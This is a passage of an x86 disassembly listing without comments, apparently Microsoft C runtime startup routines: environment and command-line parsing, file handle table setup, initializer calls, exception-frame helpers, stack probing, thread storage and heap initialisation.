  424ca3:	mov    esi,DWORD PTR ds:0x4635b4
  424ca9:	push   ebp
  424caa:	jmp    0x424cd6
  424cac:	push   esi
  424cad:	call   0x425a40
  424cb2:	mov    ebp,eax
  424cb4:	inc    ebp
  424cb5:	cmp    BYTE PTR [esi],0x3d
  424cb8:	pop    ecx
  424cb9:	je     0x424cd4
  424cbb:	push   ebp
  424cbc:	call   0x426152
  424cc1:	cmp    eax,ebx
  424cc3:	pop    ecx
  424cc4:	mov    DWORD PTR [edi],eax
  424cc6:	je     0x424cff
  424cc8:	push   esi
  424cc9:	push   eax
  424cca:	call   0x425810
  424ccf:	pop    ecx
  424cd0:	pop    ecx
  424cd1:	add    edi,0x4
  424cd4:	add    esi,ebp
  424cd6:	cmp    BYTE PTR [esi],bl
  424cd8:	jne    0x424cac
  424cda:	push   DWORD PTR ds:0x4635b4
  424ce0:	call   0x42603a
  424ce5:	mov    DWORD PTR ds:0x4635b4,ebx
  424ceb:	mov    DWORD PTR [edi],ebx
  424ced:	mov    DWORD PTR ds:0x463d60,0x1
  424cf7:	xor    eax,eax
  424cf9:	pop    ecx
  424cfa:	pop    ebp
  424cfb:	pop    edi
  424cfc:	pop    esi
  424cfd:	pop    ebx
  424cfe:	ret    
  424cff:	push   DWORD PTR ds:0x4635e4
  424d05:	call   0x42603a
  424d0a:	mov    DWORD PTR ds:0x4635e4,ebx
  424d10:	or     eax,0xffffffff
  424d13:	jmp    0x424cf9
  424d15:	push   ebp
  424d16:	mov    ebp,esp
  424d18:	push   ecx
  424d19:	push   ebx
  424d1a:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1d:	xor    edx,edx
  424d1f:	cmp    DWORD PTR [ebp+0x8],edx
  424d22:	push   edi
  424d23:	mov    DWORD PTR [esi],edx
  424d25:	mov    edi,ecx
  424d27:	mov    DWORD PTR [ebx],0x1
  424d2d:	je     0x424d38
  424d2f:	mov    ecx,DWORD PTR [ebp+0x8]
  424d32:	add    DWORD PTR [ebp+0x8],0x4
  424d36:	mov    DWORD PTR [ecx],edi
  424d38:	cmp    BYTE PTR [eax],0x22
  424d3b:	jne    0x424d4b
  424d3d:	xor    ecx,ecx
  424d3f:	test   edx,edx
  424d41:	sete   cl
  424d44:	inc    eax
  424d45:	mov    edx,ecx
  424d47:	mov    cl,0x22
  424d49:	jmp    0x424d78
  424d4b:	inc    DWORD PTR [esi]
  424d4d:	test   edi,edi
  424d4f:	je     0x424d56
  424d51:	mov    cl,BYTE PTR [eax]
  424d53:	mov    BYTE PTR [edi],cl
  424d55:	inc    edi
  424d56:	mov    cl,BYTE PTR [eax]
  424d58:	movzx  ebx,cl
  424d5b:	inc    eax
  424d5c:	test   BYTE PTR [ebx+0x463a21],0x4
  424d63:	je     0x424d71
  424d65:	inc    DWORD PTR [esi]
  424d67:	test   edi,edi
  424d69:	je     0x424d70
  424d6b:	mov    bl,BYTE PTR [eax]
  424d6d:	mov    BYTE PTR [edi],bl
  424d6f:	inc    edi
  424d70:	inc    eax
  424d71:	test   cl,cl
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	je     0x424daa
  424d78:	test   edx,edx
  424d7a:	jne    0x424d38
  424d7c:	cmp    cl,0x20
  424d7f:	je     0x424d86
  424d81:	cmp    cl,0x9
  424d84:	jne    0x424d38
  424d86:	test   edi,edi
  424d88:	je     0x424d8e
  424d8a:	and    BYTE PTR [edi-0x1],0x0
  424d8e:	and    DWORD PTR [ebp-0x4],0x0
  424d92:	cmp    BYTE PTR [eax],0x0
  424d95:	je     0x424e71
  424d9b:	mov    cl,BYTE PTR [eax]
  424d9d:	cmp    cl,0x20
  424da0:	je     0x424da7
  424da2:	cmp    cl,0x9
  424da5:	jne    0x424dad
  424da7:	inc    eax
  424da8:	jmp    0x424d9b
  424daa:	dec    eax
  424dab:	jmp    0x424d8e
  424dad:	cmp    BYTE PTR [eax],0x0
  424db0:	je     0x424e71
  424db6:	cmp    DWORD PTR [ebp+0x8],0x0
  424dba:	je     0x424dc5
  424dbc:	mov    ecx,DWORD PTR [ebp+0x8]
  424dbf:	add    DWORD PTR [ebp+0x8],0x4
  424dc3:	mov    DWORD PTR [ecx],edi
  424dc5:	inc    DWORD PTR [ebx]
  424dc7:	xor    ebx,ebx
  424dc9:	inc    ebx
  424dca:	xor    edx,edx
  424dcc:	jmp    0x424dd0
  424dce:	inc    eax
  424dcf:	inc    edx
  424dd0:	cmp    BYTE PTR [eax],0x5c
  424dd3:	je     0x424dce
  424dd5:	cmp    BYTE PTR [eax],0x22
  424dd8:	jne    0x424e00
  424dda:	test   dl,0x1
  424ddd:	jne    0x424dfe
  424ddf:	cmp    DWORD PTR [ebp-0x4],0x0
  424de3:	je     0x424df1
  424de5:	lea    ecx,[eax+0x1]
  424de8:	cmp    BYTE PTR [ecx],0x22
  424deb:	jne    0x424df1
  424ded:	mov    eax,ecx
  424def:	jmp    0x424df3
  424df1:	xor    ebx,ebx
  424df3:	xor    ecx,ecx
  424df5:	cmp    DWORD PTR [ebp-0x4],ecx
  424df8:	sete   cl
  424dfb:	mov    DWORD PTR [ebp-0x4],ecx
  424dfe:	shr    edx,1
  424e00:	test   edx,edx
  424e02:	je     0x424e11
  424e04:	test   edi,edi
  424e06:	je     0x424e0c
  424e08:	mov    BYTE PTR [edi],0x5c
  424e0b:	inc    edi
  424e0c:	inc    DWORD PTR [esi]
  424e0e:	dec    edx
  424e0f:	jne    0x424e04
  424e11:	mov    cl,BYTE PTR [eax]
  424e13:	test   cl,cl
  424e15:	je     0x424e5f
  424e17:	cmp    DWORD PTR [ebp-0x4],0x0
  424e1b:	jne    0x424e27
  424e1d:	cmp    cl,0x20
  424e20:	je     0x424e5f
  424e22:	cmp    cl,0x9
  424e25:	je     0x424e5f
  424e27:	test   ebx,ebx
  424e29:	je     0x424e59
  424e2b:	test   edi,edi
  424e2d:	je     0x424e48
  424e2f:	movzx  edx,cl
  424e32:	test   BYTE PTR [edx+0x463a21],0x4
  424e39:	je     0x424e41
  424e3b:	mov    BYTE PTR [edi],cl
  424e3d:	inc    edi
  424e3e:	inc    eax
  424e3f:	inc    DWORD PTR [esi]
  424e41:	mov    cl,BYTE PTR [eax]
  424e43:	mov    BYTE PTR [edi],cl
  424e45:	inc    edi
  424e46:	jmp    0x424e57
  424e48:	movzx  ecx,cl
  424e4b:	test   BYTE PTR [ecx+0x463a21],0x4
  424e52:	je     0x424e57
  424e54:	inc    eax
  424e55:	inc    DWORD PTR [esi]
  424e57:	inc    DWORD PTR [esi]
  424e59:	inc    eax
  424e5a:	jmp    0x424dc7
  424e5f:	test   edi,edi
  424e61:	je     0x424e67
  424e63:	and    BYTE PTR [edi],0x0
  424e66:	inc    edi
  424e67:	inc    DWORD PTR [esi]
  424e69:	mov    ebx,DWORD PTR [ebp+0xc]
  424e6c:	jmp    0x424d92
  424e71:	mov    eax,DWORD PTR [ebp+0x8]
  424e74:	test   eax,eax
  424e76:	je     0x424e7b
  424e78:	and    DWORD PTR [eax],0x0
  424e7b:	inc    DWORD PTR [ebx]
  424e7d:	pop    edi
  424e7e:	pop    ebx
  424e7f:	leave  
  424e80:	ret    
  424e81:	push   ebp
  424e82:	mov    ebp,esp
  424e84:	push   ecx
  424e85:	push   ecx
  424e86:	push   ebx
  424e87:	push   esi
  424e88:	push   edi
  424e89:	xor    edi,edi
  424e8b:	cmp    DWORD PTR ds:0x463d6c,edi
  424e91:	jne    0x424e98
  424e93:	call   0x42601c
  424e98:	and    BYTE PTR ds:0x463714,0x0
  424e9f:	push   0x104
  424ea4:	mov    esi,0x463610
  424ea9:	push   esi
  424eaa:	push   edi
  424eab:	call   DWORD PTR ds:0x4290a8
  424eb1:	mov    eax,ds:0x463d74
  424eb6:	cmp    eax,edi
  424eb8:	mov    DWORD PTR ds:0x4635f4,esi
  424ebe:	je     0x424ec7
  424ec0:	cmp    BYTE PTR [eax],0x0
  424ec3:	mov    ebx,eax
  424ec5:	jne    0x424ec9
  424ec7:	mov    ebx,esi
  424ec9:	lea    eax,[ebp-0x4]
  424ecc:	push   eax
  424ecd:	push   edi
  424ece:	lea    esi,[ebp-0x8]
  424ed1:	xor    ecx,ecx
  424ed3:	mov    eax,ebx
  424ed5:	call   0x424d15
  424eda:	mov    esi,DWORD PTR [ebp-0x4]
  424edd:	mov    eax,DWORD PTR [ebp-0x8]
  424ee0:	shl    esi,0x2
  424ee3:	add    eax,esi
  424ee5:	push   eax
  424ee6:	call   0x426152
  424eeb:	mov    edi,eax
  424eed:	add    esp,0xc
  424ef0:	test   edi,edi
  424ef2:	jne    0x424ef9
  424ef4:	or     eax,0xffffffff
  424ef7:	jmp    0x424f1e
  424ef9:	lea    eax,[ebp-0x4]
  424efc:	push   eax
  424efd:	lea    ecx,[esi+edi*1]
  424f00:	push   edi
  424f01:	lea    esi,[ebp-0x8]
  424f04:	mov    eax,ebx
  424f06:	call   0x424d15
  424f0b:	mov    eax,DWORD PTR [ebp-0x4]
  424f0e:	dec    eax
  424f0f:	pop    ecx
  424f10:	mov    ds:0x4635d8,eax
  424f15:	pop    ecx
  424f16:	mov    DWORD PTR ds:0x4635dc,edi
  424f1c:	xor    eax,eax
  424f1e:	pop    edi
  424f1f:	pop    esi
  424f20:	pop    ebx
  424f21:	leave  
  424f22:	ret    
  424f23:	push   ecx
  424f24:	push   ecx
  424f25:	mov    eax,ds:0x463718
  424f2a:	push   ebx
  424f2b:	push   ebp
  424f2c:	push   esi
  424f2d:	push   edi
  424f2e:	mov    edi,DWORD PTR ds:0x4290c0
  424f34:	xor    ebx,ebx
  424f36:	xor    esi,esi
  424f38:	cmp    eax,ebx
  424f3a:	push   0x2
  424f3c:	pop    ebp
  424f3d:	jne    0x424f6c
  424f3f:	call   edi
  424f41:	mov    esi,eax
  424f43:	cmp    esi,ebx
  424f45:	je     0x424f53
  424f47:	mov    DWORD PTR ds:0x463718,0x1
  424f51:	jmp    0x424f71
  424f53:	call   DWORD PTR ds:0x429030
  424f59:	cmp    eax,0x78
  424f5c:	jne    0x424f67
  424f5e:	mov    eax,ebp
  424f60:	mov    ds:0x463718,eax
  424f65:	jmp    0x424f6c
  424f67:	mov    eax,ds:0x463718
  424f6c:	cmp    eax,0x1
  424f6f:	jne    0x424fee
  424f71:	cmp    esi,ebx
  424f73:	jne    0x424f7d
  424f75:	call   edi
  424f77:	mov    esi,eax
  424f79:	cmp    esi,ebx
  424f7b:	je     0x424ff6
  424f7d:	cmp    WORD PTR [esi],bx
  424f80:	mov    eax,esi
  424f82:	je     0x424f92
  424f84:	add    eax,ebp
  424f86:	cmp    WORD PTR [eax],bx
  424f89:	jne    0x424f84
  424f8b:	add    eax,ebp
  424f8d:	cmp    WORD PTR [eax],bx
  424f90:	jne    0x424f84
  424f92:	mov    edi,DWORD PTR ds:0x4290bc
  424f98:	push   ebx
  424f99:	push   ebx
  424f9a:	push   ebx
  424f9b:	sub    eax,esi
  424f9d:	push   ebx
  424f9e:	sar    eax,1
  424fa0:	inc    eax
  424fa1:	push   eax
  424fa2:	push   esi
  424fa3:	push   ebx
  424fa4:	push   ebx
  424fa5:	mov    DWORD PTR [esp+0x34],eax
  424fa9:	call   edi
  424fab:	mov    ebp,eax
  424fad:	cmp    ebp,ebx
  424faf:	je     0x424fe3
  424fb1:	push   ebp
  424fb2:	call   0x426152
  424fb7:	cmp    eax,ebx
  424fb9:	pop    ecx
  424fba:	mov    DWORD PTR [esp+0x10],eax
  424fbe:	je     0x424fe3
  424fc0:	push   ebx
  424fc1:	push   ebx
  424fc2:	push   ebp
  424fc3:	push   eax
  424fc4:	push   DWORD PTR [esp+0x24]
  424fc8:	push   esi
  424fc9:	push   ebx
  424fca:	push   ebx
  424fcb:	call   edi
  424fcd:	test   eax,eax
  424fcf:	jne    0x424fdf
  424fd1:	push   DWORD PTR [esp+0x10]
  424fd5:	call   0x42603a
  424fda:	pop    ecx
  424fdb:	mov    DWORD PTR [esp+0x10],ebx
  424fdf:	mov    ebx,DWORD PTR [esp+0x10]
  424fe3:	push   esi
  424fe4:	call   DWORD PTR ds:0x4290b8
  424fea:	mov    eax,ebx
  424fec:	jmp    0x42503e
  424fee:	cmp    eax,ebp
  424ff0:	je     0x424ffa
  424ff2:	cmp    eax,ebx
  424ff4:	je     0x424ffa
  424ff6:	xor    eax,eax
  424ff8:	jmp    0x42503e
  424ffa:	call   DWORD PTR ds:0x4290b4
  425000:	mov    esi,eax
  425002:	cmp    esi,ebx
  425004:	je     0x424ff6
  425006:	cmp    BYTE PTR [esi],bl
  425008:	je     0x425014
  42500a:	inc    eax
  42500b:	cmp    BYTE PTR [eax],bl
  42500d:	jne    0x42500a
  42500f:	inc    eax
  425010:	cmp    BYTE PTR [eax],bl
  425012:	jne    0x42500a
  425014:	sub    eax,esi
  425016:	inc    eax
  425017:	mov    ebp,eax
  425019:	push   ebp
  42501a:	call   0x426152
  42501f:	mov    edi,eax
  425021:	cmp    edi,ebx
  425023:	pop    ecx
  425024:	jne    0x42502a
  425026:	xor    edi,edi
  425028:	jmp    0x425035
  42502a:	push   ebp
  42502b:	push   esi
  42502c:	push   edi
  42502d:	call   0x426170
  425032:	add    esp,0xc
  425035:	push   esi
  425036:	call   DWORD PTR ds:0x4290b0
  42503c:	mov    eax,edi
  42503e:	pop    edi
  42503f:	pop    esi
  425040:	pop    ebp
  425041:	pop    ebx
  425042:	pop    ecx
  425043:	pop    ecx
  425044:	ret    
  425045:	sub    esp,0x48
  425048:	push   ebx
  425049:	mov    ebx,0x480
  42504e:	push   ebx
  42504f:	call   0x426152
  425054:	test   eax,eax
  425056:	pop    ecx
  425057:	jne    0x425061
  425059:	or     eax,0xffffffff
  42505c:	jmp    0x42523e
  425061:	mov    ds:0x463c60,eax
  425066:	mov    DWORD PTR ds:0x463c48,0x20
  425070:	lea    ecx,[eax+0x480]
  425076:	jmp    0x425096
  425078:	and    BYTE PTR [eax+0x4],0x0
  42507c:	or     DWORD PTR [eax],0xffffffff
  42507f:	and    DWORD PTR [eax+0x8],0x0
  425083:	mov    BYTE PTR [eax+0x5],0xa
  425087:	mov    ecx,DWORD PTR ds:0x463c60
  42508d:	add    eax,0x24
  425090:	add    ecx,0x480
  425096:	cmp    eax,ecx
  425098:	jb     0x425078
  42509a:	push   ebp
  42509b:	push   esi
  42509c:	push   edi
  42509d:	lea    eax,[esp+0x14]
  4250a1:	push   eax
  4250a2:	call   DWORD PTR ds:0x429090
  4250a8:	cmp    WORD PTR [esp+0x46],0x0
  4250ae:	je     0x42519d
  4250b4:	mov    eax,DWORD PTR [esp+0x48]
  4250b8:	test   eax,eax
  4250ba:	je     0x42519d
  4250c0:	mov    edi,DWORD PTR [eax]
  4250c2:	lea    ebp,[eax+0x4]
  4250c5:	lea    eax,[edi+ebp*1]
  4250c8:	mov    DWORD PTR [esp+0x10],eax
  4250cc:	mov    eax,0x800
  4250d1:	cmp    edi,eax
  4250d3:	jl     0x4250d7
  4250d5:	mov    edi,eax
  4250d7:	cmp    DWORD PTR ds:0x463c48,edi
  4250dd:	jge    0x42512d
  4250df:	mov    esi,0x463c64
  4250e4:	push   ebx
  4250e5:	call   0x426152
  4250ea:	test   eax,eax
  4250ec:	pop    ecx
  4250ed:	je     0x425127
  4250ef:	add    DWORD PTR ds:0x463c48,0x20
  4250f6:	mov    DWORD PTR [esi],eax
  4250f8:	lea    ecx,[eax+0x480]
  4250fe:	jmp    0x425116
  425100:	and    BYTE PTR [eax+0x4],0x0
  425104:	or     DWORD PTR [eax],0xffffffff
  425107:	and    DWORD PTR [eax+0x8],0x0
  42510b:	mov    BYTE PTR [eax+0x5],0xa
  42510f:	mov    ecx,DWORD PTR [esi]
  425111:	add    eax,0x24
  425114:	add    ecx,ebx
  425116:	cmp    eax,ecx
  425118:	jb     0x425100
  42511a:	add    esi,0x4
  42511d:	cmp    DWORD PTR ds:0x463c48,edi
  425123:	jl     0x4250e4
  425125:	jmp    0x42512d
  425127:	mov    edi,DWORD PTR ds:0x463c48
  42512d:	xor    ebx,ebx
  42512f:	test   edi,edi
  425131:	jle    0x42519d
  425133:	mov    eax,DWORD PTR [esp+0x10]
  425137:	mov    eax,DWORD PTR [eax]
  425139:	cmp    eax,0xffffffff
  42513c:	je     0x425192
  42513e:	mov    cl,BYTE PTR [ebp+0x0]
  425141:	test   cl,0x1
  425144:	je     0x425192
  425146:	test   cl,0x8
  425149:	jne    0x425156
  42514b:	push   eax
  42514c:	call   DWORD PTR ds:0x4290c8
  425152:	test   eax,eax
  425154:	je     0x425192
  425156:	mov    ecx,ebx
  425158:	mov    eax,ebx
  42515a:	and    eax,0x1f
  42515d:	lea    eax,[eax+eax*8]
  425160:	sar    ecx,0x5
  425163:	mov    ecx,DWORD PTR [ecx*4+0x463c60]
  42516a:	lea    esi,[ecx+eax*4]
  42516d:	mov    eax,DWORD PTR [esp+0x10]
  425171:	mov    eax,DWORD PTR [eax]
  425173:	mov    DWORD PTR [esi],eax
  425175:	mov    al,BYTE PTR [ebp+0x0]
  425178:	mov    BYTE PTR [esi+0x4],al
  42517b:	lea    eax,[esi+0xc]
  42517e:	push   0xfa0
  425183:	push   eax
  425184:	call   0x4264bd
  425189:	test   eax,eax
  42518b:	pop    ecx
  42518c:	pop    ecx
  42518d:	je     0x4251bd
  42518f:	inc    DWORD PTR [esi+0x8]
  425192:	add    DWORD PTR [esp+0x10],0x4
  425197:	inc    ebx
  425198:	inc    ebp
  425199:	cmp    ebx,edi
  42519b:	jl     0x425133
  42519d:	xor    ebx,ebx
  42519f:	mov    ecx,DWORD PTR ds:0x463c60
  4251a5:	lea    eax,[ebx+ebx*8]
  4251a8:	lea    esi,[ecx+eax*4]
  4251ab:	cmp    DWORD PTR [esi],0xffffffff
  4251ae:	jne    0x42521f
  4251b0:	test   ebx,ebx
  4251b2:	mov    BYTE PTR [esi+0x4],0x81
  4251b6:	jne    0x4251c2
  4251b8:	push   0xfffffff6
  4251ba:	pop    eax
  4251bb:	jmp    0x4251cc
  4251bd:	or     eax,0xffffffff
  4251c0:	jmp    0x42523b
  4251c2:	mov    eax,ebx
  4251c4:	dec    eax
  4251c5:	neg    eax
  4251c7:	sbb    eax,eax
  4251c9:	add    eax,0xfffffff5
  4251cc:	push   eax
  4251cd:	call   DWORD PTR ds:0x4290a4
  4251d3:	mov    edi,eax
  4251d5:	cmp    edi,0xffffffff
  4251d8:	je     0x425219
  4251da:	push   edi
  4251db:	call   DWORD PTR ds:0x4290c8
  4251e1:	test   eax,eax
  4251e3:	je     0x425219
  4251e5:	and    eax,0xff
  4251ea:	cmp    eax,0x2
  4251ed:	mov    DWORD PTR [esi],edi
  4251ef:	jne    0x4251f7
  4251f1:	or     BYTE PTR [esi+0x4],0x40
  4251f5:	jmp    0x425200
  4251f7:	cmp    eax,0x3
  4251fa:	jne    0x425200
  4251fc:	or     BYTE PTR [esi+0x4],0x8
  425200:	lea    eax,[esi+0xc]
  425203:	push   0xfa0
  425208:	push   eax
  425209:	call   0x4264bd
  42520e:	test   eax,eax
  425210:	pop    ecx
  425211:	pop    ecx
  425212:	je     0x4251bd
  425214:	inc    DWORD PTR [esi+0x8]
  425217:	jmp    0x425223
  425219:	or     BYTE PTR [esi+0x4],0x40
  42521d:	jmp    0x425223
  42521f:	or     BYTE PTR [esi+0x4],0x80
  425223:	inc    ebx
  425224:	cmp    ebx,0x3
  425227:	jl     0x42519f
  42522d:	push   DWORD PTR ds:0x463c48
  425233:	call   DWORD PTR ds:0x4290c4
  425239:	xor    eax,eax
  42523b:	pop    edi
  42523c:	pop    esi
  42523d:	pop    ebp
  42523e:	pop    ebx
  42523f:	add    esp,0x48
  425242:	ret    
  425243:	push   0xc
  425245:	push   0x4295f8
  42524a:	call   0x425434
  42524f:	mov    DWORD PTR [ebp-0x1c],0x42a050
  425256:	cmp    DWORD PTR [ebp-0x1c],0x42a050
  42525d:	jae    0x425281
  42525f:	and    DWORD PTR [ebp-0x4],0x0
  425263:	mov    eax,DWORD PTR [ebp-0x1c]
  425266:	mov    eax,DWORD PTR [eax]
  425268:	test   eax,eax
  42526a:	je     0x425277
  42526c:	call   eax
  42526e:	jmp    0x425277
  425270:	xor    eax,eax
  425272:	inc    eax
  425273:	ret    
  425274:	mov    esp,DWORD PTR [ebp-0x18]
  425277:	or     DWORD PTR [ebp-0x4],0xffffffff
  42527b:	add    DWORD PTR [ebp-0x1c],0x4
  42527f:	jmp    0x425256
  425281:	call   0x42546f
  425286:	ret    
  425287:	push   0xc
  425289:	push   0x429608
  42528e:	call   0x425434
  425293:	mov    DWORD PTR [ebp-0x1c],0x42a058
  42529a:	cmp    DWORD PTR [ebp-0x1c],0x42a058
  4252a1:	jae    0x4252c5
  4252a3:	and    DWORD PTR [ebp-0x4],0x0
  4252a7:	mov    eax,DWORD PTR [ebp-0x1c]
  4252aa:	mov    eax,DWORD PTR [eax]
  4252ac:	test   eax,eax
  4252ae:	je     0x4252bb
  4252b0:	call   eax
  4252b2:	jmp    0x4252bb
  4252b4:	xor    eax,eax
  4252b6:	inc    eax
  4252b7:	ret    
  4252b8:	mov    esp,DWORD PTR [ebp-0x18]
  4252bb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4252bf:	add    DWORD PTR [ebp-0x1c],0x4
  4252c3:	jmp    0x42529a
  4252c5:	call   0x42546f
  4252ca:	ret    
  4252cb:	call   0x425506
  4252d0:	mov    eax,ds:0x462dfc
  4252d5:	cmp    eax,0xffffffff
  4252d8:	je     0x4252e8
  4252da:	push   eax
  4252db:	call   DWORD PTR ds:0x4290d0
  4252e1:	or     DWORD PTR ds:0x462dfc,0xffffffff
  4252e8:	ret    
  4252e9:	push   ebx
  4252ea:	push   esi
  4252eb:	call   DWORD PTR ds:0x429030
  4252f1:	push   DWORD PTR ds:0x462dfc
  4252f7:	mov    ebx,eax
  4252f9:	call   DWORD PTR ds:0x4290e0
  4252ff:	mov    esi,eax
  425301:	test   esi,esi
  425303:	jne    0x42534e
  425305:	push   0x88
  42530a:	push   0x1
  42530c:	call   0x426548
  425311:	mov    esi,eax
  425313:	test   esi,esi
  425315:	pop    ecx
  425316:	pop    ecx
  425317:	je     0x425346
  425319:	push   esi
  42531a:	push   DWORD PTR ds:0x462dfc
  425320:	call   DWORD PTR ds:0x4290dc
  425326:	test   eax,eax
  425328:	je     0x425346
  42532a:	mov    DWORD PTR [esi+0x54],0x462d50
  425331:	mov    DWORD PTR [esi+0x14],0x1
  425338:	call   DWORD PTR ds:0x4290d8
  42533e:	or     DWORD PTR [esi+0x4],0xffffffff
  425342:	mov    DWORD PTR [esi],eax
  425344:	jmp    0x42534e
  425346:	push   0x10
  425348:	call   0x4244fc
  42534d:	pop    ecx
  42534e:	push   ebx
  42534f:	call   DWORD PTR ds:0x4290d4
  425355:	mov    eax,esi
  425357:	pop    esi
  425358:	pop    ebx
  425359:	ret    
  42535a:	call   0x4254bd
  42535f:	test   eax,eax
  425361:	je     0x425373
  425363:	call   DWORD PTR ds:0x4290e4
  425369:	cmp    eax,0xffffffff
  42536c:	mov    ds:0x462dfc,eax
  425371:	jne    0x42537b
  425373:	call   0x4252cb
  425378:	xor    eax,eax
  42537a:	ret    
  42537b:	push   esi
  42537c:	push   0x88
  425381:	push   0x1
  425383:	call   0x426548
  425388:	mov    esi,eax
  42538a:	test   esi,esi
  42538c:	pop    ecx
  42538d:	pop    ecx
  42538e:	je     0x4253c0
  425390:	push   esi
  425391:	push   DWORD PTR ds:0x462dfc
  425397:	call   DWORD PTR ds:0x4290dc
  42539d:	test   eax,eax
  42539f:	je     0x4253c0
  4253a1:	mov    DWORD PTR [esi+0x54],0x462d50
  4253a8:	mov    DWORD PTR [esi+0x14],0x1
  4253af:	call   DWORD PTR ds:0x4290d8
  4253b5:	or     DWORD PTR [esi+0x4],0xffffffff
  4253b9:	mov    DWORD PTR [esi],eax
  4253bb:	xor    eax,eax
  4253bd:	inc    eax
  4253be:	pop    esi
  4253bf:	ret    
  4253c0:	call   0x4252cb
  4253c5:	xor    eax,eax
  4253c7:	pop    esi
  4253c8:	ret    
  4253c9:	cmp    DWORD PTR ds:0x4635c4,0x2
  4253d0:	jne    0x4253df
  4253d2:	cmp    DWORD PTR ds:0x4635d0,0x5
  4253d9:	jb     0x4253df
  4253db:	xor    eax,eax
  4253dd:	inc    eax
  4253de:	ret    
  4253df:	push   0x3
  4253e1:	pop    eax
  4253e2:	ret    
  4253e3:	xor    eax,eax
  4253e5:	cmp    DWORD PTR [esp+0x4],eax
  4253e9:	push   0x0
  4253eb:	sete   al
  4253ee:	push   0x1000
  4253f3:	push   eax
  4253f4:	call   DWORD PTR ds:0x429040
  4253fa:	test   eax,eax
  4253fc:	mov    ds:0x463c40,eax
  425401:	je     0x42542d
  425403:	call   0x4253c9
  425408:	cmp    eax,0x3
  42540b:	mov    ds:0x463c44,eax
  425410:	jne    0x425430
  425412:	push   0x3f8
  425417:	call   0x4267ca
  42541c:	test   eax,eax
  42541e:	pop    ecx
  42541f:	jne    0x425430
  425421:	push   DWORD PTR ds:0x463c40
  425427:	call   DWORD PTR ds:0x4290e8
  42542d:	xor    eax,eax
  42542f:	ret    
  425430:	xor    eax,eax
  425432:	inc    eax
  425433:	ret    
  425434:	push   0x4272f8
  425439:	mov    eax,fs:0x0
  42543f:	push   eax
  425440:	mov    eax,DWORD PTR [esp+0x10]
  425444:	mov    DWORD PTR [esp+0x10],ebp
  425448:	lea    ebp,[esp+0x10]
  42544c:	sub    esp,eax
  42544e:	push   ebx
  42544f:	push   esi
  425450:	push   edi
  425451:	mov    eax,DWORD PTR [ebp-0x8]
  425454:	mov    DWORD PTR [ebp-0x18],esp
  425457:	push   eax
  425458:	mov    eax,DWORD PTR [ebp-0x4]
  42545b:	mov    DWORD PTR [ebp-0x4],0xffffffff
  425462:	mov    DWORD PTR [ebp-0x8],eax
  425465:	lea    eax,[ebp-0x10]
  425468:	mov    fs:0x0,eax
  42546e:	ret    
  42546f:	mov    ecx,DWORD PTR [ebp-0x10]
  425472:	mov    DWORD PTR fs:0x0,ecx
  425479:	pop    ecx
  42547a:	pop    edi
  42547b:	pop    esi
  42547c:	pop    ebx
  42547d:	leave  
  42547e:	push   ecx
  42547f:	ret    
  425480:	cmp    eax,0x1000
  425485:	jae    0x425495
  425487:	neg    eax
  425489:	add    eax,esp
  42548b:	add    eax,0x4
  42548e:	test   DWORD PTR [eax],eax
  425490:	xchg   esp,eax
  425491:	mov    eax,DWORD PTR [eax]
  425493:	push   eax
  425494:	ret    
  425495:	push   ecx
  425496:	lea    ecx,[esp+0x8]
  42549a:	sub    ecx,0x1000
  4254a0:	sub    eax,0x1000
  4254a5:	test   DWORD PTR [ecx],eax
  4254a7:	cmp    eax,0x1000
  4254ac:	jae    0x42549a
  4254ae:	sub    ecx,eax
  4254b0:	mov    eax,esp
  4254b2:	test   DWORD PTR [ecx],eax
  4254b4:	mov    esp,ecx
  4254b6:	mov    ecx,DWORD PTR [eax]
  4254b8:	mov    eax,DWORD PTR [eax+0x4]
  4254bb:	push   eax
  4254bc:	ret    
  4254bd:	push   esi
  4254be:	push   edi
  4254bf:	xor    esi,esi
  4254c1:	mov    edi,0x463720
  4254c6:	cmp    DWORD PTR [esi*8+0x462e14],0x1
  4254ce:	jne    0x4254ee
  4254d0:	lea    eax,[esi*8+0x462e10]
  4254d7:	mov    DWORD PTR [eax],edi
  4254d9:	push   0xfa0
  4254de:	push   DWORD PTR [eax]
  4254e0:	add    edi,0x18
  4254e3:	call   0x4264bd
  4254e8:	test   eax,eax
  4254ea:	pop    ecx
  4254eb:	pop    ecx
  4254ec:	je     0x4254fa
  4254ee:	inc    esi
  4254ef:	cmp    esi,0x24
  4254f2:	jl     0x4254c6
  4254f4:	xor    eax,eax
  4254f6:	inc    eax
  4254f7:	pop    edi
  4254f8:	pop    esi
  4254f9:	ret    
  4254fa:	and    DWORD PTR [esi*8+0x462e10],0x0
  425502:	xor    eax,eax
  425504:	jmp    0x4254f7
  425506:	push   ebx
  425507:	mov    ebx,DWORD PTR ds:0x4290cc
  42550d:	push   esi
  42550e:	mov    esi,0x462e10
  425513:	push   edi
  425514:	mov    edi,DWORD PTR [esi]
  425516:	test   edi,edi
  425518:	je     0x42552d
  42551a:	cmp    DWORD PTR [esi+0x4],0x1
  42551e:	je     0x42552d
  425520:	push   edi
  425521:	call   ebx
  425523:	push   edi
  425524:	call   0x42603a
  425529:	and    DWORD PTR [esi],0x0
  42552c:	pop    ecx
  42552d:	add    esi,0x8
  425530:	cmp    esi,0x462f30
  425536:	jl     0x425514
  425538:	mov    esi,0x462e10
  42553d:	pop    edi
  42553e:	mov    eax,DWORD PTR [esi]
  425540:	test   eax,eax
  425542:	je     0x42554d
  425544:	cmp    DWORD PTR [esi+0x4],0x1
  425548:	jne    0x42554d
  42554a:	push   eax
  42554b:	call   ebx
  42554d:	add    esi,0x8
  425550:	cmp    esi,0x462f30
  425556:	jl     0x42553e
  425558:	pop    esi
  425559:	pop    ebx
  42555a:	ret    
  42555b:	push   ebp
  42555c:	mov    ebp,esp
  42555e:	mov    eax,DWORD PTR [ebp+0x8]
  425561:	push   DWORD PTR [eax*8+0x462e10]
  425568:	call   DWORD PTR ds:0x4290f0
  42556e:	pop    ebp
  42556f:	ret    
  425570:	push   ebp
  425571:	mov    ebp,esp
  425573:	push   esi
  425574:	mov    esi,DWORD PTR [ebp+0x8]
  425577:	lea    esi,[esi*8+0x462e10]
  42557e:	cmp    DWORD PTR [esi],0x0
  425581:	je     0x425588
  425583:	xor    eax,eax
  425585:	inc    eax
  425586:	jmp    0x4255ec
  425588:	push   edi
  425589:	push   0x18
  42558b:	call   0x426152
  425590:	mov    edi,eax
  425592:	test   edi,edi
  425594:	pop    ecx
